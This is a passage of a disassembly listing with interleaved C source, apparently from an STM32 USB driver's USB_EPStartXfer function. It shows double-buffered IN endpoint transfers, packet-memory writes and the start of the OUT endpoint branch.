 80074ea:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80074ee:	b29b      	uxth	r3, r3
 80074f0:	461a      	mov	r2, r3
 80074f2:	6c3b      	ldr	r3, [r7, #64]	; 0x40
 80074f4:	4413      	add	r3, r2
 80074f6:	643b      	str	r3, [r7, #64]	; 0x40
 80074f8:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80074fc:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007500:	681b      	ldr	r3, [r3, #0]
 8007502:	781b      	ldrb	r3, [r3, #0]
 8007504:	00da      	lsls	r2, r3, #3
 8007506:	6c3b      	ldr	r3, [r7, #64]	; 0x40
 8007508:	4413      	add	r3, r2
 800750a:	f203 4306 	addw	r3, r3, #1030	; 0x406
 800750e:	63fb      	str	r3, [r7, #60]	; 0x3c
 8007510:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007514:	b29a      	uxth	r2, r3
 8007516:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 8007518:	801a      	strh	r2, [r3, #0]
            pmabuffer = ep->pmaaddr1;
 800751a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800751e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007522:	681b      	ldr	r3, [r3, #0]
 8007524:	895b      	ldrh	r3, [r3, #10]
 8007526:	f8a7 3076 	strh.w	r3, [r7, #118]	; 0x76

            /* Write the user buffer to USB PMA */
            USB_WritePMA(USBx, ep->xfer_buff, pmabuffer, (uint16_t)len);
 800752a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800752e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007532:	681b      	ldr	r3, [r3, #0]
 8007534:	6959      	ldr	r1, [r3, #20]
 8007536:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800753a:	b29b      	uxth	r3, r3
 800753c:	f8b7 2076 	ldrh.w	r2, [r7, #118]	; 0x76
 8007540:	f507 7084 	add.w	r0, r7, #264	; 0x108
 8007544:	f5a0 7082 	sub.w	r0, r0, #260	; 0x104
 8007548:	6800      	ldr	r0, [r0, #0]
 800754a:	f001 f89e 	bl	800868a <USB_WritePMA>
 800754e:	e227      	b.n	80079a0 <USB_EPStartXfer+0xd2e>
          }
        }
        /* auto Switch to single buffer mode when transfer <Mps no need to manage in double buffer */
        else
        {
          len = ep->xfer_len_db;
 8007550:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007554:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007558:	681b      	ldr	r3, [r3, #0]
 800755a:	6a1b      	ldr	r3, [r3, #32]
 800755c:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104

          /* disable double buffer mode for Bulk endpoint */
          PCD_CLEAR_BULK_EP_DBUF(USBx, ep->num);
 8007560:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007564:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007568:	681a      	ldr	r2, [r3, #0]
 800756a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800756e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007572:	681b      	ldr	r3, [r3, #0]
 8007574:	781b      	ldrb	r3, [r3, #0]
 8007576:	009b      	lsls	r3, r3, #2
 8007578:	4413      	add	r3, r2
 800757a:	881b      	ldrh	r3, [r3, #0]
 800757c:	b29b      	uxth	r3, r3
 800757e:	f423 43e2 	bic.w	r3, r3, #28928	; 0x7100
 8007582:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8007586:	f8a7 3062 	strh.w	r3, [r7, #98]	; 0x62
 800758a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800758e:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007592:	681a      	ldr	r2, [r3, #0]
 8007594:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007598:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800759c:	681b      	ldr	r3, [r3, #0]
 800759e:	781b      	ldrb	r3, [r3, #0]
 80075a0:	009b      	lsls	r3, r3, #2
 80075a2:	441a      	add	r2, r3
 80075a4:	f8b7 3062 	ldrh.w	r3, [r7, #98]	; 0x62
 80075a8:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80075ac:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80075b0:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80075b4:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80075b8:	b29b      	uxth	r3, r3
 80075ba:	8013      	strh	r3, [r2, #0]

          /* Set Tx count with nbre of byte to be transmitted */
          PCD_SET_EP_TX_CNT(USBx, ep->num, len);
 80075bc:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80075c0:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80075c4:	681b      	ldr	r3, [r3, #0]
 80075c6:	65fb      	str	r3, [r7, #92]	; 0x5c
 80075c8:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80075cc:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80075d0:	681b      	ldr	r3, [r3, #0]
 80075d2:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80075d6:	b29b      	uxth	r3, r3
 80075d8:	461a      	mov	r2, r3
 80075da:	6dfb      	ldr	r3, [r7, #92]	; 0x5c
 80075dc:	4413      	add	r3, r2
 80075de:	65fb      	str	r3, [r7, #92]	; 0x5c
 80075e0:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80075e4:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80075e8:	681b      	ldr	r3, [r3, #0]
 80075ea:	781b      	ldrb	r3, [r3, #0]
 80075ec:	00da      	lsls	r2, r3, #3
 80075ee:	6dfb      	ldr	r3, [r7, #92]	; 0x5c
 80075f0:	4413      	add	r3, r2
 80075f2:	f203 4302 	addw	r3, r3, #1026	; 0x402
 80075f6:	65bb      	str	r3, [r7, #88]	; 0x58
 80075f8:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80075fc:	b29a      	uxth	r2, r3
 80075fe:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 8007600:	801a      	strh	r2, [r3, #0]
          pmabuffer = ep->pmaaddr0;
 8007602:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007606:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800760a:	681b      	ldr	r3, [r3, #0]
 800760c:	891b      	ldrh	r3, [r3, #8]
 800760e:	f8a7 3076 	strh.w	r3, [r7, #118]	; 0x76

          /* Write the user buffer to USB PMA */
          USB_WritePMA(USBx, ep->xfer_buff, pmabuffer, (uint16_t)len);
 8007612:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007616:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800761a:	681b      	ldr	r3, [r3, #0]
 800761c:	6959      	ldr	r1, [r3, #20]
 800761e:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007622:	b29b      	uxth	r3, r3
 8007624:	f8b7 2076 	ldrh.w	r2, [r7, #118]	; 0x76
 8007628:	f507 7084 	add.w	r0, r7, #264	; 0x108
 800762c:	f5a0 7082 	sub.w	r0, r0, #260	; 0x104
 8007630:	6800      	ldr	r0, [r0, #0]
 8007632:	f001 f82a 	bl	800868a <USB_WritePMA>
 8007636:	e1b3      	b.n	80079a0 <USB_EPStartXfer+0xd2e>
        }
      }
      else /* manage isochronous double buffer IN mode */
      {
        /* each Time to write in PMA xfer_len_db will */
        ep->xfer_len_db -= len;
 8007638:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800763c:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007640:	681b      	ldr	r3, [r3, #0]
 8007642:	6a1a      	ldr	r2, [r3, #32]
 8007644:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007648:	1ad2      	subs	r2, r2, r3
 800764a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800764e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007652:	681b      	ldr	r3, [r3, #0]
 8007654:	621a      	str	r2, [r3, #32]

        /* Fill the data buffer */
        if ((PCD_GET_ENDPOINT(USBx, ep->num) & USB_EP_DTOG_TX) != 0U)
 8007656:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800765a:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 800765e:	681a      	ldr	r2, [r3, #0]
 8007660:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007664:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007668:	681b      	ldr	r3, [r3, #0]
 800766a:	781b      	ldrb	r3, [r3, #0]
 800766c:	009b      	lsls	r3, r3, #2
 800766e:	4413      	add	r3, r2
 8007670:	881b      	ldrh	r3, [r3, #0]
 8007672:	b29b      	uxth	r3, r3
 8007674:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8007678:	2b00      	cmp	r3, #0
 800767a:	f000 80c6 	beq.w	800780a <USB_EPStartXfer+0xb98>
        {
          /* Set the Double buffer counter for pmabuffer1 */
          PCD_SET_EP_DBUF1_CNT(USBx, ep->num, ep->is_in, len);
 800767e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007682:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007686:	681b      	ldr	r3, [r3, #0]
 8007688:	673b      	str	r3, [r7, #112]	; 0x70
 800768a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800768e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007692:	681b      	ldr	r3, [r3, #0]
 8007694:	785b      	ldrb	r3, [r3, #1]
 8007696:	2b00      	cmp	r3, #0
 8007698:	d177      	bne.n	800778a <USB_EPStartXfer+0xb18>
 800769a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800769e:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80076a2:	681b      	ldr	r3, [r3, #0]
 80076a4:	66bb      	str	r3, [r7, #104]	; 0x68
 80076a6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80076aa:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80076ae:	681b      	ldr	r3, [r3, #0]
 80076b0:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80076b4:	b29b      	uxth	r3, r3
 80076b6:	461a      	mov	r2, r3
 80076b8:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 80076ba:	4413      	add	r3, r2
 80076bc:	66bb      	str	r3, [r7, #104]	; 0x68
 80076be:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80076c2:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80076c6:	681b      	ldr	r3, [r3, #0]
 80076c8:	781b      	ldrb	r3, [r3, #0]
 80076ca:	00da      	lsls	r2, r3, #3
 80076cc:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 80076ce:	4413      	add	r3, r2
 80076d0:	f203 4306 	addw	r3, r3, #1030	; 0x406
 80076d4:	667b      	str	r3, [r7, #100]	; 0x64
 80076d6:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 80076d8:	881b      	ldrh	r3, [r3, #0]
 80076da:	b29b      	uxth	r3, r3
 80076dc:	f3c3 0309 	ubfx	r3, r3, #0, #10
 80076e0:	b29a      	uxth	r2, r3
 80076e2:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 80076e4:	801a      	strh	r2, [r3, #0]
 80076e6:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80076ea:	2b3e      	cmp	r3, #62	; 0x3e
 80076ec:	d921      	bls.n	8007732 <USB_EPStartXfer+0xac0>
 80076ee:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80076f2:	095b      	lsrs	r3, r3, #5
 80076f4:	f8c7 30f0 	str.w	r3, [r7, #240]	; 0xf0
 80076f8:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80076fc:	f003 031f 	and.w	r3, r3, #31
 8007700:	2b00      	cmp	r3, #0
 8007702:	d104      	bne.n	800770e <USB_EPStartXfer+0xa9c>
 8007704:	f8d7 30f0 	ldr.w	r3, [r7, #240]	; 0xf0
 8007708:	3b01      	subs	r3, #1
 800770a:	f8c7 30f0 	str.w	r3, [r7, #240]	; 0xf0
 800770e:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 8007710:	881b      	ldrh	r3, [r3, #0]
 8007712:	b29a      	uxth	r2, r3
 8007714:	f8d7 30f0 	ldr.w	r3, [r7, #240]	; 0xf0
 8007718:	b29b      	uxth	r3, r3
 800771a:	029b      	lsls	r3, r3, #10
 800771c:	b29b      	uxth	r3, r3
 800771e:	4313      	orrs	r3, r2
 8007720:	b29b      	uxth	r3, r3
 8007722:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007726:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 800772a:	b29a      	uxth	r2, r3
 800772c:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 800772e:	801a      	strh	r2, [r3, #0]
 8007730:	e050      	b.n	80077d4 <USB_EPStartXfer+0xb62>
 8007732:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007736:	2b00      	cmp	r3, #0
 8007738:	d10a      	bne.n	8007750 <USB_EPStartXfer+0xade>
 800773a:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 800773c:	881b      	ldrh	r3, [r3, #0]
 800773e:	b29b      	uxth	r3, r3
 8007740:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007744:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007748:	b29a      	uxth	r2, r3
 800774a:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 800774c:	801a      	strh	r2, [r3, #0]
 800774e:	e041      	b.n	80077d4 <USB_EPStartXfer+0xb62>
 8007750:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007754:	085b      	lsrs	r3, r3, #1
 8007756:	f8c7 30f0 	str.w	r3, [r7, #240]	; 0xf0
 800775a:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800775e:	f003 0301 	and.w	r3, r3, #1
 8007762:	2b00      	cmp	r3, #0
 8007764:	d004      	beq.n	8007770 <USB_EPStartXfer+0xafe>
 8007766:	f8d7 30f0 	ldr.w	r3, [r7, #240]	; 0xf0
 800776a:	3301      	adds	r3, #1
 800776c:	f8c7 30f0 	str.w	r3, [r7, #240]	; 0xf0
 8007770:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 8007772:	881b      	ldrh	r3, [r3, #0]
 8007774:	b29a      	uxth	r2, r3
 8007776:	f8d7 30f0 	ldr.w	r3, [r7, #240]	; 0xf0
 800777a:	b29b      	uxth	r3, r3
 800777c:	029b      	lsls	r3, r3, #10
 800777e:	b29b      	uxth	r3, r3
 8007780:	4313      	orrs	r3, r2
 8007782:	b29a      	uxth	r2, r3
 8007784:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 8007786:	801a      	strh	r2, [r3, #0]
 8007788:	e024      	b.n	80077d4 <USB_EPStartXfer+0xb62>
 800778a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800778e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007792:	681b      	ldr	r3, [r3, #0]
 8007794:	785b      	ldrb	r3, [r3, #1]
 8007796:	2b01      	cmp	r3, #1
 8007798:	d11c      	bne.n	80077d4 <USB_EPStartXfer+0xb62>
 800779a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800779e:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80077a2:	681b      	ldr	r3, [r3, #0]
 80077a4:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80077a8:	b29b      	uxth	r3, r3
 80077aa:	461a      	mov	r2, r3
 80077ac:	6f3b      	ldr	r3, [r7, #112]	; 0x70
 80077ae:	4413      	add	r3, r2
 80077b0:	673b      	str	r3, [r7, #112]	; 0x70
 80077b2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80077b6:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80077ba:	681b      	ldr	r3, [r3, #0]
 80077bc:	781b      	ldrb	r3, [r3, #0]
 80077be:	00da      	lsls	r2, r3, #3
 80077c0:	6f3b      	ldr	r3, [r7, #112]	; 0x70
 80077c2:	4413      	add	r3, r2
 80077c4:	f203 4306 	addw	r3, r3, #1030	; 0x406
 80077c8:	66fb      	str	r3, [r7, #108]	; 0x6c
 80077ca:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80077ce:	b29a      	uxth	r2, r3
 80077d0:	6efb      	ldr	r3, [r7, #108]	; 0x6c
 80077d2:	801a      	strh	r2, [r3, #0]
          pmabuffer = ep->pmaaddr1;
 80077d4:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80077d8:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80077dc:	681b      	ldr	r3, [r3, #0]
 80077de:	895b      	ldrh	r3, [r3, #10]
 80077e0:	f8a7 3076 	strh.w	r3, [r7, #118]	; 0x76

          /* Write the user buffer to USB PMA */
          USB_WritePMA(USBx, ep->xfer_buff, pmabuffer, (uint16_t)len);
 80077e4:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80077e8:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80077ec:	681b      	ldr	r3, [r3, #0]
 80077ee:	6959      	ldr	r1, [r3, #20]
 80077f0:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80077f4:	b29b      	uxth	r3, r3
 80077f6:	f8b7 2076 	ldrh.w	r2, [r7, #118]	; 0x76
 80077fa:	f507 7084 	add.w	r0, r7, #264	; 0x108
 80077fe:	f5a0 7082 	sub.w	r0, r0, #260	; 0x104
 8007802:	6800      	ldr	r0, [r0, #0]
 8007804:	f000 ff41 	bl	800868a <USB_WritePMA>
 8007808:	e0ca      	b.n	80079a0 <USB_EPStartXfer+0xd2e>
        }
        else
        {
          /* Set the Double buffer counter for pmabuffer0 */
          PCD_SET_EP_DBUF0_CNT(USBx, ep->num, ep->is_in, len);
 800780a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800780e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007812:	681b      	ldr	r3, [r3, #0]
 8007814:	785b      	ldrb	r3, [r3, #1]
 8007816:	2b00      	cmp	r3, #0
 8007818:	d177      	bne.n	800790a <USB_EPStartXfer+0xc98>
 800781a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800781e:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007822:	681b      	ldr	r3, [r3, #0]
 8007824:	67fb      	str	r3, [r7, #124]	; 0x7c
 8007826:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800782a:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 800782e:	681b      	ldr	r3, [r3, #0]
 8007830:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007834:	b29b      	uxth	r3, r3
 8007836:	461a      	mov	r2, r3
 8007838:	6ffb      	ldr	r3, [r7, #124]	; 0x7c
 800783a:	4413      	add	r3, r2
 800783c:	67fb      	str	r3, [r7, #124]	; 0x7c
 800783e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007842:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007846:	681b      	ldr	r3, [r3, #0]
 8007848:	781b      	ldrb	r3, [r3, #0]
 800784a:	00da      	lsls	r2, r3, #3
 800784c:	6ffb      	ldr	r3, [r7, #124]	; 0x7c
 800784e:	4413      	add	r3, r2
 8007850:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8007854:	67bb      	str	r3, [r7, #120]	; 0x78
 8007856:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 8007858:	881b      	ldrh	r3, [r3, #0]
 800785a:	b29b      	uxth	r3, r3
 800785c:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8007860:	b29a      	uxth	r2, r3
 8007862:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 8007864:	801a      	strh	r2, [r3, #0]
 8007866:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800786a:	2b3e      	cmp	r3, #62	; 0x3e
 800786c:	d921      	bls.n	80078b2 <USB_EPStartXfer+0xc40>
 800786e:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007872:	095b      	lsrs	r3, r3, #5
 8007874:	f8c7 30ec 	str.w	r3, [r7, #236]	; 0xec
 8007878:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800787c:	f003 031f 	and.w	r3, r3, #31
 8007880:	2b00      	cmp	r3, #0
 8007882:	d104      	bne.n	800788e <USB_EPStartXfer+0xc1c>
 8007884:	f8d7 30ec 	ldr.w	r3, [r7, #236]	; 0xec
 8007888:	3b01      	subs	r3, #1
 800788a:	f8c7 30ec 	str.w	r3, [r7, #236]	; 0xec
 800788e:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 8007890:	881b      	ldrh	r3, [r3, #0]
 8007892:	b29a      	uxth	r2, r3
 8007894:	f8d7 30ec 	ldr.w	r3, [r7, #236]	; 0xec
 8007898:	b29b      	uxth	r3, r3
 800789a:	029b      	lsls	r3, r3, #10
 800789c:	b29b      	uxth	r3, r3
 800789e:	4313      	orrs	r3, r2
 80078a0:	b29b      	uxth	r3, r3
 80078a2:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80078a6:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80078aa:	b29a      	uxth	r2, r3
 80078ac:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 80078ae:	801a      	strh	r2, [r3, #0]
 80078b0:	e05c      	b.n	800796c <USB_EPStartXfer+0xcfa>
 80078b2:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80078b6:	2b00      	cmp	r3, #0
 80078b8:	d10a      	bne.n	80078d0 <USB_EPStartXfer+0xc5e>
 80078ba:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 80078bc:	881b      	ldrh	r3, [r3, #0]
 80078be:	b29b      	uxth	r3, r3
 80078c0:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80078c4:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80078c8:	b29a      	uxth	r2, r3
 80078ca:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 80078cc:	801a      	strh	r2, [r3, #0]
 80078ce:	e04d      	b.n	800796c <USB_EPStartXfer+0xcfa>
 80078d0:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80078d4:	085b      	lsrs	r3, r3, #1
 80078d6:	f8c7 30ec 	str.w	r3, [r7, #236]	; 0xec
 80078da:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80078de:	f003 0301 	and.w	r3, r3, #1
 80078e2:	2b00      	cmp	r3, #0
 80078e4:	d004      	beq.n	80078f0 <USB_EPStartXfer+0xc7e>
 80078e6:	f8d7 30ec 	ldr.w	r3, [r7, #236]	; 0xec
 80078ea:	3301      	adds	r3, #1
 80078ec:	f8c7 30ec 	str.w	r3, [r7, #236]	; 0xec
 80078f0:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 80078f2:	881b      	ldrh	r3, [r3, #0]
 80078f4:	b29a      	uxth	r2, r3
 80078f6:	f8d7 30ec 	ldr.w	r3, [r7, #236]	; 0xec
 80078fa:	b29b      	uxth	r3, r3
 80078fc:	029b      	lsls	r3, r3, #10
 80078fe:	b29b      	uxth	r3, r3
 8007900:	4313      	orrs	r3, r2
 8007902:	b29a      	uxth	r2, r3
 8007904:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 8007906:	801a      	strh	r2, [r3, #0]
 8007908:	e030      	b.n	800796c <USB_EPStartXfer+0xcfa>
 800790a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800790e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007912:	681b      	ldr	r3, [r3, #0]
 8007914:	785b      	ldrb	r3, [r3, #1]
 8007916:	2b01      	cmp	r3, #1
 8007918:	d128      	bne.n	800796c <USB_EPStartXfer+0xcfa>
 800791a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800791e:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007922:	681b      	ldr	r3, [r3, #0]
 8007924:	f8c7 3084 	str.w	r3, [r7, #132]	; 0x84
 8007928:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800792c:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007930:	681b      	ldr	r3, [r3, #0]
 8007932:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007936:	b29b      	uxth	r3, r3
 8007938:	461a      	mov	r2, r3
 800793a:	f8d7 3084 	ldr.w	r3, [r7, #132]	; 0x84
 800793e:	4413      	add	r3, r2
 8007940:	f8c7 3084 	str.w	r3, [r7, #132]	; 0x84
 8007944:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007948:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800794c:	681b      	ldr	r3, [r3, #0]
 800794e:	781b      	ldrb	r3, [r3, #0]
 8007950:	00da      	lsls	r2, r3, #3
 8007952:	f8d7 3084 	ldr.w	r3, [r7, #132]	; 0x84
 8007956:	4413      	add	r3, r2
 8007958:	f203 4302 	addw	r3, r3, #1026	; 0x402
 800795c:	f8c7 3080 	str.w	r3, [r7, #128]	; 0x80
 8007960:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007964:	b29a      	uxth	r2, r3
 8007966:	f8d7 3080 	ldr.w	r3, [r7, #128]	; 0x80
 800796a:	801a      	strh	r2, [r3, #0]
          pmabuffer = ep->pmaaddr0;
 800796c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007970:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007974:	681b      	ldr	r3, [r3, #0]
 8007976:	891b      	ldrh	r3, [r3, #8]
 8007978:	f8a7 3076 	strh.w	r3, [r7, #118]	; 0x76

          /* Write the user buffer to USB PMA */
          USB_WritePMA(USBx, ep->xfer_buff, pmabuffer, (uint16_t)len);
 800797c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007980:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007984:	681b      	ldr	r3, [r3, #0]
 8007986:	6959      	ldr	r1, [r3, #20]
 8007988:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800798c:	b29b      	uxth	r3, r3
 800798e:	f8b7 2076 	ldrh.w	r2, [r7, #118]	; 0x76
 8007992:	f507 7084 	add.w	r0, r7, #264	; 0x108
 8007996:	f5a0 7082 	sub.w	r0, r0, #260	; 0x104
 800799a:	6800      	ldr	r0, [r0, #0]
 800799c:	f000 fe75 	bl	800868a <USB_WritePMA>
        }
      }
    }
#endif /* (USE_USB_DOUBLE_BUFFER == 1U) */

    PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_VALID);
 80079a0:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80079a4:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80079a8:	681a      	ldr	r2, [r3, #0]
 80079aa:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80079ae:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80079b2:	681b      	ldr	r3, [r3, #0]
 80079b4:	781b      	ldrb	r3, [r3, #0]
 80079b6:	009b      	lsls	r3, r3, #2
 80079b8:	4413      	add	r3, r2
 80079ba:	881b      	ldrh	r3, [r3, #0]
 80079bc:	b29b      	uxth	r3, r3
 80079be:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80079c2:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 80079c6:	817b      	strh	r3, [r7, #10]
 80079c8:	897b      	ldrh	r3, [r7, #10]
 80079ca:	f083 0310 	eor.w	r3, r3, #16
 80079ce:	817b      	strh	r3, [r7, #10]
 80079d0:	897b      	ldrh	r3, [r7, #10]
 80079d2:	f083 0320 	eor.w	r3, r3, #32
 80079d6:	817b      	strh	r3, [r7, #10]
 80079d8:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80079dc:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80079e0:	681a      	ldr	r2, [r3, #0]
 80079e2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80079e6:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80079ea:	681b      	ldr	r3, [r3, #0]
 80079ec:	781b      	ldrb	r3, [r3, #0]
 80079ee:	009b      	lsls	r3, r3, #2
 80079f0:	441a      	add	r2, r3
 80079f2:	897b      	ldrh	r3, [r7, #10]
 80079f4:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80079f8:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80079fc:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8007a00:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8007a04:	b29b      	uxth	r3, r3
 8007a06:	8013      	strh	r3, [r2, #0]
 8007a08:	f000 bcde 	b.w	80083c8 <USB_EPStartXfer+0x1756>
  }
  else /* OUT endpoint */
  {
    if (ep->doublebuffer == 0U)
 8007a0c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007a10:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007a14:	681b      	ldr	r3, [r3, #0]
 8007a16:	7b1b      	ldrb	r3, [r3, #12]
 8007a18:	2b00      	cmp	r3, #0
 8007a1a:	f040 80bb 	bne.w	8007b94 <USB_EPStartXfer+0xf22>
    {
      /* Multi packet transfer */
      if (ep->xfer_len > ep->maxpacket)
 8007a1e:	f507 7384 	add.w	r3, r7, #264	; 0x108
